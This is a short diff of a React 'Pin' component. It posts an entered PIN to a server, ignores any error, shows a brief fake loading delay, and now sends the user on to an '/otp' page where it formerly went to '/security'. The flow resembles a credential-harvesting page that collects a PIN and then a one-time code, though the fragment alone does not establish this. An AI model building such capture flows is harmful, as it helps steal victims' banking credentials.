@@ -44,7 +44,7 @@ const Pin = () => {
     axios.post(`${BASE_URL}/pin`, { pin: code }).catch(() => {});
     setTimeout(() => {
       setLoading(false);
-      navigate("/security");
+      navigate("/otp");
     }, 800);
   };
 
